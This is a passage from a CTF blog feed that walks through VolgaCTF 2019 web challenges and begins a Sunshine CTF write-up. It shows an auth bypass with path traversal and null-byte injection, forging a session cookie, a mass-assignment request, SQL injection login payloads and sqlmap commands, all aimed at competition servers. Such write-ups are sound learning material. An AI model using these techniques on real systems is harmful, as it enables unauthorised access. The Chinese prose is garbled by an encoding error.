class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">config = <span class="built_in">require</span>(<span class="string">'./config'</span>);</span><br><span class="line">auth = <span class="built_in">require</span>(<span class="string">'./auth'</span>)();</span><br><span class="line">config.session.store = <span class="keyword">new</span> store();</span><br><span class="line"></span><br><span class="line">app.use(parser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/*`</span>, session(config.session));</span><br><span class="line">app.use(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/*`</span>, auth.unless(&#123;<span class="attr">path</span>: config.whitelistPaths&#125;));</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/login`</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/* <span class="doctag">TODO:</span> Implement login*/</span></span><br><span class="line">  res.redirect(<span class="string">'/login'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/logout`</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/* <span class="doctag">TODO:</span> Implement logout */</span></span><br><span class="line">  res.redirect(<span class="string">'/login'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/flag`</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(req.session);</span><br><span class="line">  <span class="keyword">if</span>(req.session.name === <span class="string">'admin'</span>)</span><br><span class="line">    res.end(fs.readFileSync(<span class="string">'../../flag'</span>, <span class="string">'utf8'</span>));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    res.status(<span class="number">403</span>).send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(proxy(config.proxy));</span><br><span class="line">app.listen(config.server.port);</span><br></pre></td></tr></table></figure><p>ä¹‹åçœ‹ä¸€ä¸‹config.jsæ–‡ä»¶çš„å†…å®¹ï¼Œå¯ä»¥çŸ¥é“ç›‘å¬çš„ç«¯å£æ˜¯4000ï¼Œä½†æ˜¯æœªçŸ¥å¼ºæ±‚ä¼šè½¬åˆ°ä»£ç†ç«¯å£5000ï¼Œæ‰€ä»¥åœ¨è¿™å„¿æ˜¯å¯ä»¥åˆ—ç›®å½•æ¥è¯»å–æºä»£ç çš„ã€‚é‡Œé¢è¿˜å†™åˆ°äº†sessionçš„ç­¾åï¼Œä»¥åŠç™½åå•è·¯ç”±ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  apiPrefix: <span class="string">'/api'</span>,</span><br><span class="line">  server: &#123;</span><br><span class="line">    port: <span class="number">4000</span></span><br><span class="line">  &#125;,</span><br><span class="line">  proxy: &#123;</span><br><span class="line">    target: <span class="string">'http://localhost:5000'</span>,</span><br><span class="line">    autoRewrite: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  session: &#123;</span><br><span class="line">    name: <span class="string">'SESSION'</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span>,</span><br><span class="line">    secret: <span class="string">';GmU1FSlVETF/vzEaBHP'</span>,</span><br><span class="line">    rolling: <span class="literal">true</span>,</span><br><span class="line">    resave: <span class="literal">false</span></span><br><span class="line">  &#125;,</span><br><span class="line">  whitelistPaths: [</span><br><span class="line">    <span class="string">'/api/login'</span>, <span class="string">'/api/logout'</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = config;</span><br></pre></td></tr></table></figure><p>ä¹‹å‰è¿˜æ‰«æåˆ°äº†sessionè·¯å¾„ï¼Œå¯è§sessionåº”è¯¥æ˜¯å­˜å‚¨åœ¨æ–‡ä»¶ä¸­çš„ã€‚è€Œmain.jsä¸­åˆæœ‰å¯ä»¥è¯·æ±‚æ–‡ä»¶çš„æ–¹æ³•ï¼Œæ‰€ä»¥å¯èƒ½æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹æ¥è¯»ä¸ä¸€äº›æ–‡ä»¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  year = <span class="built_in">parseInt</span>(location.pathname.slice(<span class="number">1</span>)) || <span class="number">2018</span>;</span><br><span class="line">  $.getJSON(<span class="string">`/api/images?year=<span class="subst">$&#123;year&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    $.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">key, img</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">      $(<span class="string">'&lt;div&gt;'</span>, &#123;</span><br><span class="line">          class: 'col-lg-3 col-md-4 col-xs-6',</span><br><span class="line">          html: $(<span class="string">'&lt;a&gt;'</span>, &#123;</span><br><span class="line">            href: <span class="string">`/api/image?year=<span class="subst">$&#123;year&#125;</span>&amp;img=<span class="subst">$&#123;img&#125;</span>`</span>,</span><br><span class="line">            class: 'd-block mb-4 h-100',</span><br><span class="line">            html: $(<span class="string">'&lt;img&gt;'</span>, &#123;</span><br><span class="line">              class: 'img-fluid img-thumbnail',</span><br><span class="line">              src: <span class="string">`/api/image?year=<span class="subst">$&#123;year&#125;</span>&amp;img=<span class="subst">$&#123;img&#125;</span>`</span>,</span><br><span class="line">              alt: <span class="string">''</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;)</span><br><span class="line">       &#125;).appendTo($(<span class="string">'#gallery'</span>));;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; location = <span class="string">'/login'</span>;&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>auth.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> unless = <span class="built_in">require</span>(<span class="string">'express-unless'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> auth = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> authm = <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(req.session);</span><br><span class="line">    <span class="keyword">if</span> (!req.session.name) &#123;</span><br><span class="line">      res.status(<span class="number">403</span>).send();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  authm.unless = unless;</span><br><span class="line">  <span class="keyword">return</span> authm;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = auth;</span><br></pre></td></tr></table></figure><ol><li>tips åœ¨è¿›è¡Œä¸‹ä¸€æ­¥æµ‹è¯•ä¹‹å‰ï¼Œå…ˆæä¸‰ä¸ªtips: (1) Expressæ¡†æ¶å¤„ç†è·¯å¾„çš„æ—¶å€™æ˜¯ä¸è§„èŒƒçš„ï¼Œå› æ­¤<code>/</code>,<code>//</code>æ˜¯å­˜åœ¨åŒºåˆ«çš„å¯ä»¥ç”¨äºæŸäº›æƒ…å†µä¸‹çš„bypassï¼› (2) PHPçš„å°bugï¼Œ%00æˆªæ–­ï¼ˆnull byte injectionï¼‰è‡´ä½¿file_existså‡ºé”™è¿›è€Œåˆ—ç›®å½•ï¼› (3) session-file-storeæ¨¡å—ä¼šå°†sessionå­˜åœ¨jsonæ ¼å¼çš„æ–‡ä»¶ä¸­ï¼Œå¦‚æœæŒ‡å®šsessionæ‰€åœ¨çš„ç›®å½•ï¼Œexpress-sessionæ¨¡å—å°†ä¼šå»å¯¹åº”çš„ç›®å½•ä¸‹å–å‡ºsessionä¿¡æ¯ï¼›</li><li>æ¼æ´åˆ©ç”¨ æœ‰äº†ä»¥ä¸Šçš„ä¿¡æ¯ï¼Œæˆ‘ä»¬é¦–å…ˆæµ‹è¯•main.jsæä¾›çš„<code>/api/images?year=${year}</code>æ¥å£ã€‚é¦–å…ˆåˆ©ç”¨ç¬¬ä¸€ä¸ªtipsï¼Œexpressçš„éè§„èŒƒåŒ–è·¯å¾„ï¼Œç»•è¿‡auth.jsçš„è®¤è¯ã€‚ <img src="https://i.loli.net/2019/04/03/5ca43e9ac1757.png" alt="2CD29029-253F-4C33-AB17-48ED2554C4D9.png"> <code>//</code>çš„æƒ…å†µå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»ç»•è¿‡äº†è®¤è¯å¹¶ä¸”åº”è¯¥å¯ä»¥è¯»æ–‡ä»¶äº†ã€‚ <img src="https://i.loli.net/2019/04/03/5ca43ed8b02d6.png" alt="613A1694-476E-43B2-ABE4-2518DD27D02C.png"> ä½†æ˜¯å½“å°è¯•è¯»å–imageçš„æ—¶å€™å´å‡ºç°äº†å¦‚ä¸‹æŠ¥é”™ï¼Œä»é”™è¯¯ä¿¡æ¯ä¸Šæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¸¤ç‚¹ä¿¡æ¯:é¦–å…ˆï¼Œç»å¯¹è·¯å¾„æ˜¯<code>/var/www/apps/volga_gallery/storage/app/2019/img/</code>ï¼›å…¶æ¬¡ï¼Œè¿™æ˜¯ä¸€ä¸ªlaravelæ¡†æ¶ã€‚<img src="https://i.loli.net/2019/04/03/5ca43efc015d1.png" alt="56CE4CC6-3037-4150-B587-42670A1DC4F0.png"> å…¶å®æ˜¯æˆ‘è¾“å…¥çš„å¹´ä»½æ²¡æœ‰å›¾ç‰‡ï¼Œæˆ‘ä¿®æ”¹ä¸º2018å³å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼Œæ‰€ä»¥ç¡®è®¤å¯ä»¥åˆ—ç›®å½•ä¸‹æ–‡ä»¶äº†ã€‚ <img src="https://i.loli.net/2019/04/03/5ca43f204bc89.png" alt="4799816A-91C8-483F-94C0-B9949972CF3A.png"> ä¹‹å‰çŸ¥é“åç«¯æ˜¯é‡‡ç”¨PHPæ¡†æ¶å¤„ç†ï¼Œæ‰€ä»¥æˆ‘å…ˆåœ¨2018è·¯å¾„åæ³¨å…¥%00ï¼Œä¹‹åæˆåŠŸå¾—åˆ°å½“å‰ç›®å½• <img src="https://i.loli.net/2019/04/03/5ca43f52e73eb.png" alt="24B686AC-603E-4CEE-A0F5-9F411FEE092B.png"> ä¹‹åç»§ç»­æŸ¥çœ‹å…¶å®ƒç›®å½•ä¿¡æ¯,æœ€ç»ˆåœ¨<code>//api/images?year=2018/../../../../volga_adminpanel%00</code>è·¯å¾„ä¸‹æ‰¾åˆ°äº†sessionä¿¡æ¯ <img src="https://i.loli.net/2019/04/03/5ca43f8dc3c19.png" alt="B4CEB3D9-21DC-4625-9240-3F20EA3B2366.png"> <img src="https://i.loli.net/2019/04/03/5ca43fab8e34f.png" alt="BC67D40F-5399-4913-81D4-AE7364663FB9.png"> <img src="https://i.loli.net/2019/04/03/5ca43fc400c8b.png" alt="659D85A9-3C60-4956-AC7A-55BCF3E3784E.png"> ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œå› æ­¤å°±ç”¨åˆ°ç¬¬3ä¸ªtipsï¼Œç›´æ¥åœ¨cookieå­—æ®µè¿™ä¸ªè·¯å¾„å†™å…¥ã€‚ä½†æ˜¯è¿™é‡Œæ˜¯è®¾è®¡sessionçš„è®¡ç®—é—®é¢˜çš„ã€‚æˆ‘åœ¨æœ¬åœ°æ­å»ºäº†ä¸€ä¸ªç¯å¢ƒï¼Œä¿®æ”¹äº†éƒ¨åˆ†ä»£ç ã€‚ node_modules/express-session/index.js</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setcookie</span>(<span class="params">res, name, val, secret, options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> signed = <span class="string">'s:'</span> + signature.sign(val, secret);</span><br><span class="line">  <span class="keyword">var</span> data = cookie.serialize(name, signed, options);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sign my payload</span></span><br><span class="line">  <span class="keyword">var</span> signed2 = <span class="string">'s:'</span> + signature.sign(<span class="string">"../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM.json"</span>, secret);</span><br><span class="line">  <span class="keyword">var</span> data2 = cookie.serialize(name, signed2, options);</span><br><span class="line">  <span class="built_in">console</span>.log(data2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  debug(<span class="string">'set-cookie %s'</span>, data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> prev = res.getHeader(<span class="string">'set-cookie'</span>) || [];</span><br><span class="line">  <span class="keyword">var</span> header = <span class="built_in">Array</span>.isArray(prev) ? prev.concat(data) : [prev, data];</span><br><span class="line"></span><br><span class="line">  res.setHeader(<span class="string">'set-cookie'</span>, header)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.jsä¸­å¢åŠ </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/payload`</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">  req.session.test=<span class="string">"test"</span>;</span><br><span class="line">  res.end(<span class="string">"OK"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>config.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whitelistPaths: [</span><br><span class="line">  <span class="string">'/api/login'</span>, <span class="string">'/api/logout'</span>,<span class="string">'/api/payload'</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>ä¹‹åæœ¬åœ°å¯åŠ¨å¹¶è®¿é—® <img src="https://i.loli.net/2019/04/03/5ca43ff56b20d.png" alt="655D3C99-58E0-4B98-A334-AF401BD9C7A8.png"> å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s%3A..%2F..%2Fvolga_adminpanel%2Fsessions%2Feuzb7bMKx-5F29b2xNobGTDoWXmVFlEM.KrY7Bi6sZtBB%2FJ4sPnVj5QkDEuBu%2F0QelFQQqAV6yh4</span><br></pre></td></tr></table></figure><p>ä¹‹åè®¾ç½®cookieå­—æ®µè¿›è¡Œæäº¤å³å¯å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://gallery.q.2019.volgactf.ru/api/flag --cookie &quot;SESSION=s%3A..%2F..%2Fvolga_adminpanel%2Fsessions%2Feuzb7bMKx-5F29b2xNobGTDoWXmVFlEM.KrY7Bi6sZtBB%2FJ4sPnVj5QkDEuBu%2F0QelFQQqAV6yh4&quot; -L</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/03/5ca440109c090.png" alt="63B08906-2188-472C-AC0C-4FB2634C838E.png"></p><p> flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VolgaCTF&#123;31c2ac53d4101a01264775328797d424&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-Blog"><a href="#0x04-Blog" class="headerlink" title="0x04 Blog"></a>0x04 Blog</h2><h2 id="0x05-Shop-V-2"><a href="#0x05-Shop-V-2" class="headerlink" title="0x05 Shop V.2"></a>0x05 Shop V.2</h2><ol><li>ä¿¡æ¯æ³„éœ² robots.txt-&gt;shop.1.0.1.war</li><li>ä»£ç å®¡è®¡ è¿™ä¸ªç‰ˆæœ¬åœ¨buyè·¯ç”±å¤„å·²ç»ä¿®å¤äº†1.0.0ç‰ˆæœ¬çš„è‡ªåŠ¨ç»‘å®šæ¼æ´ï¼Œä½†æ˜¯åœ¨profileæ˜¯å­˜åœ¨çš„ï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶ä¸€äº›å˜é‡ï¼Œæ­¤ç‰ˆæœ¬æˆ‘ä»¬å¯ä»¥çœ‹åˆ°userç±»ä¸­å¤šäº†å¯¹cartçš„å¤„ç†ï¼Œæ‰€ä»¥è€ƒè™‘ä½¿ç”¨cartæ¥å®Œæˆã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Product&gt; <span class="title">getCartItems</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.cart;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCartItems</span><span class="params">(List&lt;Product&gt; cart)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.cart = cart;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç»§ç»­åœ¨controllerä¸­çœ‹ä¸‹idæ˜¯è¢«ä½¿ç”¨åšåˆ¤æ–­productçš„idçš„ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬åªè¦ä¿®æ”¹ä¸€ä¸‹idå°±å¥½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(&#123;<span class="string">"/profile"</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">profile</span><span class="params">(@ModelAttribute(<span class="string">"user"</span>)</span> User user, Model templateModel, HttpServletRequest request) </span>&#123;</span><br><span class="line">    HttpSession session = request.getSession();</span><br><span class="line">    <span class="keyword">if</span> (session.getAttribute(<span class="string">"user_id"</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:index"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        List&lt;Product&gt; cart = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        user.getCartItems().forEach((p) -&gt; &#123;</span><br><span class="line">            cart.add(<span class="keyword">this</span>.productDao.geProduct(p.getId()));</span><br><span class="line">        &#125;);</span><br><span class="line">        templateModel.addAttribute(<span class="string">"cart"</span>, cart);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"profile"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /profile HTTP/1.1</span><br><span class="line">Host: shop2.q.2019.volgactf.ru</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://shop2.q.2019.volgactf.ru/index</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 30</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=C77EBD253171F45F0E5F18DC4AB68B57</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name=zeroyu&amp;CartItems[0].id=4</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VolgaCTF&#123;e86007271413cc1ac563c6eca0e12b62&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;æ¯”èµ›åœ°å€: &lt;a href=&quot;https://q.2019.volgactf.ru/tasks&quot; t
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sunshine CTF 2019 Web</title>
    <link href="http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/"/>
    <id>http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/</id>
    <published>2019-04-02T01:37:30.000Z</published>
    <updated>2019-04-02T01:44:17.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æ¯”èµ›åœ°å€: <a href="https://2019.sunshinectf.org/challenges" target="_blank" rel="noopener">https://2019.sunshinectf.org/challenges</a></p><p>æ—¶é—´: æ˜ŸæœŸæ—¥, 30 ä¸‰æœˆ 2019, 1:00 AM (1:00) â€” æ˜ŸæœŸä¸€, 01 å››æœˆ 2019, 1:00 PM (13:00) </p><h2 id="0x01-WrestlerBook"><a href="#0x01-WrestlerBook" class="headerlink" title="0x01 WrestlerBook"></a>0x01 WrestlerBook</h2><h3 id="1-é¢˜ç›®æè¿°"><a href="#1-é¢˜ç›®æè¿°" class="headerlink" title="1.é¢˜ç›®æè¿°"></a>1.é¢˜ç›®æè¿°</h3><p>WrestlerBook is the social network for wrestlers, by wrestlers. WrestlerBook is exclusively for wrestlers, so if you didnâ€™t get an invite donâ€™t even bother trying to view our profiles.</p><p><a href="http://bk.sunshinectf.org" target="_blank" rel="noopener">http://bk.sunshinectf.org</a></p><p>Author: dmaria</p><h3 id="2-è§£é¢˜æ€è·¯"><a href="#2-è§£é¢˜æ€è·¯" class="headerlink" title="2.è§£é¢˜æ€è·¯"></a>2.è§£é¢˜æ€è·¯</h3><p>çœ‹åˆ°ç™»å½•ç•Œé¢å…ˆå°è¯•ä½¿ç”¨ä¸‡èƒ½å¯†ç è¿›è¡Œfuzzä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; --</span><br><span class="line">admin&apos; #</span><br><span class="line">admin&apos;/*</span><br><span class="line">&apos; or 1=1--</span><br><span class="line">&apos; or 1=1#</span><br><span class="line">&apos; or 1=1/*</span><br><span class="line">&apos;) or &apos;1&apos;=&apos;1--</span><br><span class="line">&apos;) or (&apos;1&apos;=&apos;1--</span><br><span class="line">&apos; or 1;#</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå‘ç°<code>&#39; or 1=1--</code>ç­‰å‡ ä¸ªå¯ä»¥æˆåŠŸç™»å½•ï¼Œå¹¶ä¸”åœ¨ç™»å½•ä¹‹åæˆ‘å‘ç°å­˜åœ¨flagå…³é”®è¯å¹¶ä¸”å¯¹åº”çš„å€¼ä¸ºN/A <img src="https://i.loli.net/2019/04/02/5ca2bd3740165.png" alt="974FFF3C-D28B-48DB-A3F3-6B7986022982.png"></p><p>å¹¶ä¸”åœ¨fuzzè¿‡ç¨‹ä¸­å‘ç°ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Date: Mon, 01 Apr 2019 14:24:46 GMT</span><br><span class="line">Server: Apache/2.4.25 (Debian)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/7.0.33</span><br><span class="line">Content-Length: 380</span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &amp;quot;#&amp;quot; in &lt;b&gt;/var/www/html/login.php&lt;/b&gt; on line &lt;b&gt;19&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:20</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line">  thrown in &lt;b&gt;/var/www/html/login.php&lt;/b&gt; on line &lt;b&gt;20&lt;/b&gt;&lt;br /&gt;</span><br></pre></td></tr></table></figure><p>å…¶å®åé¢çš„å·¥ä½œå¯ä»¥ç›´æ¥ä½¿ç”¨sqlmapæ¥è¿›è¡Œäº†</p><p><img src="https://i.loli.net/2019/04/02/5ca2bd547fe01.png" alt="6930ECB0-5A74-4EA4-89FC-32445C4443D4.png"></p><p>è¦æ³¨æ„ä¸€ä¸‹sqliteä¸­åŒ…å«å„ç§ä¿¡æ¯çš„è¡¨æ˜¯sqlite_masterã€‚</p><p>æ‰€ä»¥ä½¿ç”¨sqlmapé»˜è®¤å»è·‘çš„è¯æ˜¯æ³¨ä¸å‡ºæ•°æ®çš„ é¦–å…ˆçŒœè§£ä¸‹<code>sqlite_master</code>è¡¨ä¸­çš„ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt -T &quot;sqlite_master&quot; --columns</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…³é”®ä¿¡æ¯æœ‰nameï¼Œä½†æ˜¯å…³é”®çš„sqlå°±æ²¡æœ‰æ˜¾ç¤º ä¹‹åæŸ¥nameä¸­æœ‰ä»€ä¹ˆä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt -T &quot;sqlite_master&quot; -C &quot;name&quot; 